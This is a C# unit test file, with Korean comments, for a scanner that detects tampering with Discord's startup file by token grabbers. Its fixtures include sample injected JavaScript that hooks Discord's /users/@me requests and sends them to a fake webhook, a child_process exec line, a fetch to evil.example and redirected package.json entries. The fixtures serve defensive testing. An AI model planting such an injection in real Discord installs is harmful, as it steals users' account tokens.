using System.Security.Cryptography;
using System.Text;
using SafetySecurity.Core.Abstractions;
using SafetySecurity.Core.Engine;
using SafetySecurity.Core.Model;
using SafetySecurity.Core.Reporting;
using SafetySecurity.Core.Rules;
using SafetySecurity.Core.Scanners;

namespace SafetySecurity.Core.Tests;

/// <summary>디스코드 시작 파일(discord_desktop_core\index.js) 변조 탐지 (DISC-001, DISC-002).</summary>
public class DiscordTests
{
    private const string Local = @"C:\Users\jiyul\AppData\Local";
    private const string Stock = "module.exports = require('./core.asar');";
    private const string Package = "{\"name\":\"discord_desktop_core\",\"version\":\"0.0.307\",\"private\":\"true\",\"main\":\"index.js\"}";
    private const string BdAsar = @"C:\Users\jiyul\AppData\Roaming\BetterDiscord\data\betterdiscord.asar";

    // 토큰 그래버가 흔히 넣는 모양 (주소는 가짜예요).
    private const string Injected =
        "const { BrowserWindow, session } = require('electron');\n"
        + "const hook = 'https://discord.com/api/webhooks/000/fake';\n"
        + "session.defaultSession.webRequest.onCompleted({ urls: ['https://discord.com/api/v*/users/@me'] }, d => send(hook, d));\n"
        + Stock;

    private static string Root(string flavor = "Discord") => $@"{Local}\{flavor}";

    private static string CoreDir(string flavor = "Discord", string app = "app-1.0.9170", int n = 1) =>
        $@"{Root(flavor)}\{app}\modules\discord_desktop_core-{n}\discord_desktop_core";

    private static string Index(string flavor = "Discord", string app = "app-1.0.9170") => CoreDir(flavor, app) + @"\index.js";

    /// <summary>실제 설치처럼 Update.exe, packages, 다른 모듈까지 있는 디스코드 폴더를 만들어요.</summary>
    private static TestEnv Install(string? index = Stock, string flavor = "Discord", string app = "app-1.0.9170", string? package = Package, TestEnv? env = null)
    {
        env ??= new TestEnv();
        var root = Root(flavor);
        var dir = CoreDir(flavor, app);
        env.Files.Add(root + @"\Update.exe", TestEnv.FakePe());
        env.Files.Add(root + @"\packages\Discord-1.0.9170-full.nupkg");
        env.Files.Add($@"{root}\{app}\Discord.exe", TestEnv.FakePe());
        env.Files.Add($@"{root}\{app}\resources\app.asar");
        env.Files.Add($@"{root}\{app}\modules\discord_voice-1\discord_voice\index.js", Encoding.UTF8.GetBytes("module.exports = require('./discord_voice.node'); // 다른 모듈은 보지 않아요"));
        env.Files.Add(dir + @"\core.asar", new byte[4096]);
        if (index is not null)
        {
            env.Files.Add(dir + @"\index.js", Encoding.UTF8.GetBytes(index));
        }

        if (package is not null)
        {
            env.Files.Add(dir + @"\package.json", Encoding.UTF8.GetBytes(package));
        }

        return env;
    }

    private static List<Finding> Scan(TestEnv env, IFileSystemView? files = null) => [.. new DiscordScanner().Scan(env.Context(files: files))];

    private static string BetterDiscord(string asarPath = BdAsar, char quote = '"') =>
        $"require({quote}{asarPath.Replace(@"\", @"\\", StringComparison.Ordinal)}{quote});\nmodule.exports = require(\"./core.asar\");";

    private static string Value(Finding f, string key) => f.Evidence.Single(e => e.Key == key).Value;

    [Theory]
    [InlineData("module.exports = require('./core.asar');")]
    [InlineData("module.exports = require(\"./core.asar\");")]
    [InlineData("\uFEFFmodule.exports = require('./core.asar');\r\n")]
    [InlineData("module.exports=require('./core.asar')")]
    [InlineData("  module.exports = require( './core.asar' ) ;;\n\n")]
    [InlineData("module\n.exports =\trequire('./core.asar');")]
    public void StockIndexIsNotReported(string content)
    {
        var env = Install(content);
        Assert.Empty(Scan(env));
    }

    [Fact]
    public void EveryDiscordFlavorWithStockFilesIsClean()
    {
        var env = new TestEnv();
        foreach (var (folder, _) in DiscordScanner.Flavors)
        {
            Install(env: env, flavor: folder);
        }

        var result = ScanEngine.Run(env.Context(), [new DiscordScanner()], ScanReason.Daily, false, () => TestEnv.Now);
        Assert.Empty(result.Findings);
        Assert.Contains(DiscordScanner.CategoryName, result.CompletedCategories);
        Assert.Empty(result.Coverage);
    }

    [Fact]
    public void InjectedIndexIsHighWithEvidence()
    {
        var env = Install(Injected);
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(DiscordScanner.CategoryName, f.Category);
        Assert.Equal(Index(), f.Location);
        Assert.Null(f.Target);
        Assert.Contains("app-1.0.9170", f.Title, StringComparison.Ordinal);
        Assert.Equal(Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(Injected))), Value(f, "SHA-256"));
        Assert.Equal(Encoding.UTF8.GetByteCount(Injected).ToString("N0", System.Globalization.CultureInfo.InvariantCulture) + " 바이트", Value(f, "크기"));
        Assert.Contains("수정 시각", f.Evidence.Select(e => e.Key));
        var head = Value(f, "앞부분");
        Assert.StartsWith("const { BrowserWindow", head, StringComparison.Ordinal);
        Assert.Contains("↵", head, StringComparison.Ordinal);
        Assert.DoesNotContain("\n", head, StringComparison.Ordinal);
        Assert.Contains("api/webhooks", Value(f, "의심스러운 코드"), StringComparison.Ordinal);
        Assert.Contains("webRequest", Value(f, "의심스러운 코드"), StringComparison.Ordinal);
        Assert.Contains(f.Reasons, r => r.Contains("토큰 그래버", StringComparison.Ordinal));

        // 고치는 방법: 그 디스코드 폴더를 지우고 다시 설치, 비밀번호 변경, 모든 기기 로그아웃, 오프라인 검사.
        Assert.Contains(Root(), f.Advice, StringComparison.Ordinal);
        Assert.Contains("다시 설치", f.Advice, StringComparison.Ordinal);
        Assert.Contains("비밀번호", f.Advice, StringComparison.Ordinal);
        Assert.Contains("로그아웃", f.Advice, StringComparison.Ordinal);
        Assert.Contains("오프라인 검사", f.Advice, StringComparison.Ordinal);
    }

    [Fact]
    public void ObfuscatedInjectionWithoutKnownWordsIsStillHigh()
    {
        // 난독화해서 'webhook' 같은 글자가 없어도, 원래 한 줄이 아니면 높음이에요.
        var env = Install("var _0x1a=['\\x72\\x65'];(function(a){})(_0x1a);\n" + Stock);
        var f = Assert.Single(Scan(env));
        Assert.Equal(Severity.High, f.Severity);
        Assert.DoesNotContain("의심스러운 코드", f.Evidence.Select(e => e.Key));
    }

    [Theory]
    [InlineData("module.exports = require('./core.asar ');")]
    [InlineData("module.exports = require('./core .asar');")]
    [InlineData("module.exports = require('./ core.asar');")]
    [InlineData("Module.exports = require('./core.asar');")]
    [InlineData("module.exports = require('./core.asar');\nrequire('child_process').exec('calc')")]
    [InlineData("require('./payload.js');module.exports = require('./core.asar');")]
    [InlineData("module.exports = require('./core.asar'); // 주석도 원래 파일에는 없어요")]
    [InlineData("module.exports = require('./core.asar\u202e');")]
    [InlineData("")]
    public void AnythingElseIsHigh(string content)
    {
        var env = Install(content);
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
    }

    [Fact]
    public void InvalidUtf8IsHigh()
    {
        var env = new TestEnv();
        Install(env: env);
        var bytes = Encoding.UTF8.GetBytes(Stock);
        bytes[3] = 0xFF;
        env.Files.Add(Index(), bytes);
        Assert.Equal(Severity.High, Assert.Single(Scan(env)).Severity);
    }

    [Fact]
    public void ControlAndBidiCharactersAreShownEscaped()
    {
        var env = Install("\u0007alert();\u202e" + Stock);
        var head = Value(Assert.Single(Scan(env)), "앞부분");
        Assert.Contains("\\x07", head, StringComparison.Ordinal);
        Assert.Contains("[U+202E]", head, StringComparison.Ordinal);
        Assert.DoesNotContain("\u202e", head, StringComparison.Ordinal);
    }

    [Fact]
    public void SnippetIsCutAt200Characters()
    {
        var s = DiscordScanner.Snippet(new string('a', 500));
        Assert.Equal(DiscordScanner.SnippetChars + 1, s.Length);
        Assert.EndsWith("…", s, StringComparison.Ordinal);
        Assert.Equal("a↵b↵c↵d", DiscordScanner.Snippet("a\r\nb\nc\rd"));
    }

    [Theory]
    [InlineData('"')]
    [InlineData('\'')]
    public void BetterDiscordIsLow(char quote)
    {
        var env = Install(BetterDiscord(quote: quote));
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-002", f.RuleId);
        Assert.Equal(Severity.Low, f.Severity);
        Assert.Equal(BdAsar, f.Target);
        Assert.Contains("BetterDiscord", f.Title, StringComparison.Ordinal);
        Assert.Contains("직접 설치한 적이 없다면", f.Advice, StringComparison.Ordinal);
    }

    [Fact]
    public void BetterDiscordPathMayUseForwardSlashesAndOtherCase()
    {
        Assert.Equal(BdAsar, DiscordScanner.BetterDiscordPath(BetterDiscord("c:/users/JIYUL/appdata/roaming/betterdiscord/data/BetterDiscord.asar"), TestEnv.Paths));
    }

    [Theory]
    [InlineData(@"C:\Users\Public\BetterDiscord\data\betterdiscord.asar")]
    [InlineData(@"C:\Users\jiyul\AppData\Roaming\BetterDiscord\data\..\..\x\betterdiscord.asar")]
    [InlineData(@"C:\Users\jiyul\AppData\Roaming\BetterDiscord\data\betterdiscord.asar.js")]
    [InlineData(@"\\203.0.113.5\share\BetterDiscord\data\betterdiscord.asar")]
    public void BetterDiscordLookalikeIsHigh(string asarPath)
    {
        var env = Install(BetterDiscord(asarPath));
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
    }

    [Fact]
    public void BetterDiscordWithHiddenEscapeOrExtraCodeIsHigh()
    {
        // \x42 같은 다른 이스케이프로 경로를 숨기거나, 원래 줄 뒤에 코드를 더 붙이면 BetterDiscord 모양이 아니에요.
        var escaped = "require(\"C:\\\\Users\\\\jiyul\\\\AppData\\\\Roaming\\\\\\x42etterDiscord\\\\data\\\\betterdiscord.asar\");\n" + Stock;
        Assert.Null(DiscordScanner.BetterDiscordPath(escaped, TestEnv.Paths));
        Assert.Null(DiscordScanner.BetterDiscordPath(BetterDiscord() + "\nrequire('./x.js');", TestEnv.Paths));
        var env = Install(BetterDiscord() + "\nfetch('https://evil.example/');");
        Assert.Equal(Severity.High, Assert.Single(Scan(env)).Severity);
    }

    [Fact]
    public void InitiationFolderMakesBetterDiscordShapeHigh()
    {
        var env = Install(BetterDiscord());
        env.Files.Add(CoreDir() + @"\initiation\.keep");
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Contains(f.Reasons, r => r.Contains("initiation", StringComparison.Ordinal));
    }

    [Fact]
    public void ExtraFilesAreEvidenceButNotAFindingOnTheirOwn()
    {
        // index.js가 원래 한 줄이면 옆의 .js 파일은 불러오지 않아서 실행되지 않아요.
        var clean = Install();
        clean.Files.Add(CoreDir() + @"\helper.js", Encoding.UTF8.GetBytes("evil()"));
        Assert.Empty(Scan(clean));

        var env = Install("require('./helper.js');\n" + Stock);
        env.Files.Add(CoreDir() + @"\helper.js", Encoding.UTF8.GetBytes("evil()"));
        env.Files.Add(CoreDir() + @"\initiation\.keep");
        var f = Assert.Single(Scan(env));
        var extra = Value(f, "같은 폴더의 다른 항목");
        Assert.Contains("helper.js", extra, StringComparison.Ordinal);
        Assert.Contains(@"initiation\", extra, StringComparison.Ordinal);
        Assert.DoesNotContain("core.asar", extra, StringComparison.Ordinal);
        Assert.Contains(f.Reasons, r => r.Contains("initiation", StringComparison.Ordinal));
    }

    [Fact]
    public void LargeIndexIsHighAndNotRead()
    {
        var env = Install();
        env.Files.Add(Index(), new byte[DiscordScanner.MaxBytes + 1]);
        var files = new RecordingFiles(env.Files);
        var f = Assert.Single(Scan(env, files));
        Assert.Equal(Severity.High, f.Severity);
        Assert.DoesNotContain(Index(), files.Reads, StringComparer.OrdinalIgnoreCase);
        Assert.DoesNotContain("SHA-256", f.Evidence.Select(e => e.Key));
        Assert.Contains("1,048,577", Value(f, "크기"), StringComparison.Ordinal);
    }

    [Fact]
    public void LinkedIndexIsHighAndNotOpened()
    {
        var env = Install();
        env.Files.Add(Index(), Encoding.UTF8.GetBytes(Stock), attributes: FileAttributes.ReparsePoint);
        var files = new RecordingFiles(env.Files);
        var f = Assert.Single(Scan(env, files));
        Assert.Equal(Severity.High, f.Severity);
        Assert.DoesNotContain(files.Reads, r => r.EndsWith("index.js", StringComparison.OrdinalIgnoreCase));
        Assert.Contains("링크", Value(f, "파일 종류"), StringComparison.Ordinal);
    }

    [Fact]
    public void LinkedOrHugePackageJsonIsHigh()
    {
        var linked = Install();
        linked.Files.Add(CoreDir() + @"\package.json", Encoding.UTF8.GetBytes(Package), attributes: FileAttributes.ReparsePoint);
        Assert.Equal(Severity.High, Assert.Single(Scan(linked)).Severity);

        var huge = Install();
        huge.Files.Add(CoreDir() + @"\package.json", new byte[DiscordScanner.MaxBytes + 1]);
        Assert.Equal(Severity.High, Assert.Single(Scan(huge)).Severity);
    }

    [Theory]
    [InlineData("{\"main\":\"evil.js\"}", "main", "evil.js")]
    [InlineData("{\"main\":\"index\"}", "main", "index")]
    [InlineData("{\"main\":\"./lib/../x.js\"}", "main", "./lib/../x.js")]
    [InlineData("{\"main\":\"index.js\",\"main\":\"x.js\"}", "main", "x.js")]
    [InlineData("{\"main\":\"index.js\",\"exports\":\"./evil.js\"}", "exports", "./evil.js")]
    [InlineData("{\"main\":\"index.js\",\"exports\":{\".\":\"./evil.js\"}}", "exports", "{\".\":\"./evil.js\"}")]
    public void PackageJsonRedirectIsDetected(string json, string field, string value)
    {
        var entry = DiscordScanner.RedirectedEntry(Encoding.UTF8.GetBytes(json));
        Assert.NotNull(entry);
        Assert.Equal(field, entry!.Field);
        Assert.Equal(value, entry.Value);
    }

    [Theory]
    [InlineData(Package)]
    [InlineData("\uFEFF{\"main\":\"./index.js\"}")]
    [InlineData("{\"main\":\".\\\\index.js\"}")]
    [InlineData("{\"main\":\"INDEX.JS\"}")]
    [InlineData("{\"main\":\"x.js\",\"main\":\"index.js\"}")]
    [InlineData("{\"main\":\"\"}")]
    [InlineData("{\"main\":5}")]
    [InlineData("{\"name\":\"discord_desktop_core\"}")]
    [InlineData("{\"main\":\"index.js\",\"exports\":\"./index.js\"}")]
    [InlineData("{ broken json")]
    [InlineData("[]")]
    public void NormalOrBrokenPackageJsonIsNotARedirect(string json)
    {
        Assert.Null(DiscordScanner.RedirectedEntry(Encoding.UTF8.GetBytes(json)));
    }

    [Fact]
    public void PackageJsonRedirectWithStockIndexIsHigh()
    {
        var env = Install(package: "{\"name\":\"discord_desktop_core\",\"version\":\"0.0.307\",\"private\":\"true\",\"main\":\"./evil.js\"}");
        env.Files.Add(CoreDir() + @"\evil.js", Encoding.UTF8.GetBytes("steal()"));
        var f = Assert.Single(Scan(env));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        Assert.Equal(CoreDir() + @"\evil.js", f.Target);
        Assert.Equal("./evil.js", Value(f, "package.json main"));
        Assert.Contains("package.json SHA-256", f.Evidence.Select(e => e.Key));
        Assert.Contains("evil.js", Value(f, "같은 폴더의 다른 항목"), StringComparison.Ordinal);
    }

    [Fact]
    public void MissingIndexWithRedirectPointsAtPackageJson()
    {
        var env = Install(index: null, package: "{\"main\":\"C:\\\\Users\\\\Public\\\\x.js\"}");
        var f = Assert.Single(Scan(env));
        Assert.Equal(CoreDir() + @"\package.json", f.Location);
        Assert.Equal(@"C:\Users\Public\x.js", f.Target);

        // index.js도 package.json도 없으면 디스코드가 이 모듈을 못 불러와요 (실행되는 게 없어요).
        Assert.Empty(Scan(Install(index: null, package: null)));
    }

    [Fact]
    public void UnreadableIndexMarksTheCategoryPartial()
    {
        var env = Install(Injected);
        var files = new RecordingFiles(env.Files) { Locked = { Index() } };
        var result = ScanEngine.Run(env.Context(files: files), [new DiscordScanner()], ScanReason.Daily, false, () => TestEnv.Now);
        Assert.Empty(result.Findings);
        Assert.Contains(DiscordScanner.CategoryName, result.PartialCategories);
        Assert.DoesNotContain(DiscordScanner.CategoryName, result.CompletedCategories);
        Assert.Contains(result.Coverage, c => c.Contains(Index(), StringComparison.Ordinal));
    }

    [Fact]
    public void LinkedDiscordFolderIsNotFollowed()
    {
        // 다른 드라이브(또는 네트워크 위치)로 연결된 디스코드 폴더는 따라가지 않고 '일부만 확인'으로 남겨요.
        var env = Install(Injected);
        env.Files.LinkDirectory(Root("DiscordCanary"));
        env.Files.Add(Index("DiscordCanary"), Encoding.UTF8.GetBytes(Injected));
        var files = new RecordingFiles(env.Files);
        var result = ScanEngine.Run(env.Context(files: files), [new DiscordScanner()], ScanReason.Daily, false, () => TestEnv.Now);
        var f = Assert.Single(result.Findings);
        Assert.Equal(Index(), f.Location);
        Assert.Contains(DiscordScanner.CategoryName, result.PartialCategories);
        Assert.Contains(result.Coverage, c => c.Contains("Discord Canary", StringComparison.Ordinal));
        Assert.DoesNotContain(files.Listed, d => d.StartsWith(Root("DiscordCanary"), StringComparison.OrdinalIgnoreCase));
        Assert.DoesNotContain(files.Reads, r => r.StartsWith(Root("DiscordCanary"), StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void LinkedModulesFolderIsMediumAndNotFollowed()
    {
        var env = Install();
        const string app = @"C:\Users\jiyul\AppData\Local\Discord\app-1.0.9171";
        env.Files.Add(app + @"\Discord.exe", TestEnv.FakePe());
        env.Files.LinkDirectory(app + @"\modules");
        var files = new RecordingFiles(env.Files);
        var f = Assert.Single(Scan(env, files));
        Assert.Equal("DISC-001", f.RuleId);
        Assert.Equal(Severity.Medium, f.Severity);
        Assert.Equal(app + @"\modules", f.Location);
        Assert.DoesNotContain(files.Listed, d => d.StartsWith(app + @"\modules", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void EachAppFolderIsCheckedOnItsOwn()
    {
        // 업데이트 직후에는 예전 app-* 폴더가 남아 있기도 해요. 새로 생긴 원래 폴더는 깨끗하고, 예전 폴더의 변조만 알려요.
        var env = Install(Injected, app: "app-1.0.9169");
        Install(env: env, app: "app-1.0.9170");
        var f = Assert.Single(Scan(env));
        Assert.Equal(Index(app: "app-1.0.9169"), f.Location);

        // 같은 코드가 두 폴더에 다 들어 있으면 항목도 둘이에요 (ID가 달라요).
        Install(Injected, env: env, app: "app-1.0.9170");
        var both = Scan(env);
        Assert.Equal(2, both.Count);
        Assert.NotEqual(both[0].Id, both[1].Id);
    }

    [Fact]
    public void OtherFlavorsAreFoundAndUnrelatedFoldersAreIgnored()
    {
        var env = Install(Injected, flavor: "DiscordPTB");
        Install(Injected, env: env, flavor: "DiscordDevelopment");

        // 모르는 폴더, app-*가 아닌 폴더, 다른 모듈의 index.js는 보지 않아요.
        env.Files.Add($@"{Local}\DiscordBot\app-1.0.1\modules\discord_desktop_core-1\discord_desktop_core\index.js", Encoding.UTF8.GetBytes(Injected));
        env.Files.Add($@"{Local}\Discord\packages\modules\discord_desktop_core-1\discord_desktop_core\index.js", Encoding.UTF8.GetBytes(Injected));
        env.Files.Add($@"{Local}\Discord\app-1.0.9170\modules\discord_utils-1\discord_utils\index.js", Encoding.UTF8.GetBytes(Injected));
        var findings = Scan(env);
        Assert.Equal(2, findings.Count);
        Assert.Contains(findings, f => f.Location == Index("DiscordPTB") && f.Title.Contains("Discord PTB", StringComparison.Ordinal));
        Assert.Contains(findings, f => f.Location == Index("DiscordDevelopment") && f.Advice!.Contains(Root("DiscordDevelopment"), StringComparison.Ordinal));
    }

    [Fact]
    public void RunsOnlyInTheUserFullScan()
    {
        var s = new DiscordScanner();
        Assert.True(s.RunsIn(ScanScope.User, quick: false));
        Assert.False(s.RunsIn(ScanScope.User, quick: true));
        Assert.False(s.RunsIn(ScanScope.Admin, quick: false));
        Assert.False(s.RunsIn(ScanScope.Admin, quick: true));
        Assert.Contains(ScanEngine.AllScanners(), x => x is DiscordScanner);
        Assert.Equal("디스코드", HtmlReport.CategoryKorean(DiscordScanner.CategoryName));
    }

    [Fact]
    public void UsesThePacerAndStopsWhenAGameStarts()
    {
        var env = Install(Injected);
        var pacer = new CountingPacer(abortAfter: 3);
        var ctx = new ScanContext
        {
            Registry = env.Registry,
            Files = env.Files,
            Signatures = env.Signatures,
            Classifier = new PathClassifier(TestEnv.Paths),
            Now = TestEnv.Now,
            Pacer = pacer,
        };
        var result = ScanEngine.Run(ctx, [new DiscordScanner()], ScanReason.Daily, false, () => TestEnv.Now);
        Assert.True(result.Aborted);
        Assert.Empty(result.Findings);
        Assert.Equal(3, pacer.Steps);
    }

    private sealed class CountingPacer(int abortAfter) : IScanPacer
    {
        public int Steps { get; private set; }

        public void Step(int weight = 1)
        {
            if (++Steps >= abortAfter)
            {
                throw new ScanAbortedException("게임 시작");
            }
        }
    }

    /// <summary>어떤 폴더를 열고 어떤 파일을 읽었는지 기록해요. <see cref="Locked"/>의 파일은 잠긴 것처럼 읽지 못해요.</summary>
    private sealed class RecordingFiles(IFileSystemView inner) : IFileSystemView
    {
        public List<string> Reads { get; } = [];

        public List<string> Listed { get; } = [];

        public HashSet<string> Locked { get; } = new(StringComparer.OrdinalIgnoreCase);

        public bool FileExists(string path) => inner.FileExists(path);

        public bool DirectoryExists(string path) => inner.DirectoryExists(path);

        public FileMeta? GetMeta(string path) => inner.GetMeta(path);

        public IReadOnlyList<string> GetFiles(string directory)
        {
            Listed.Add(directory);
            return inner.GetFiles(directory);
        }

        public IReadOnlyList<string> GetDirectories(string directory)
        {
            Listed.Add(directory);
            return inner.GetDirectories(directory);
        }

        public byte[]? ReadPrefix(string path, int maxBytes)
        {
            Reads.Add(path);
            return Locked.Contains(path) ? null : inner.ReadPrefix(path, maxBytes);
        }

        public byte[]? ReadAll(string path, long maxBytes)
        {
            Reads.Add(path);
            return Locked.Contains(path) ? null : inner.ReadAll(path, maxBytes);
        }

        public string? Sha256(string path, long maxBytes)
        {
            Reads.Add(path);
            return Locked.Contains(path) ? null : inner.Sha256(path, maxBytes);
        }
    }
}
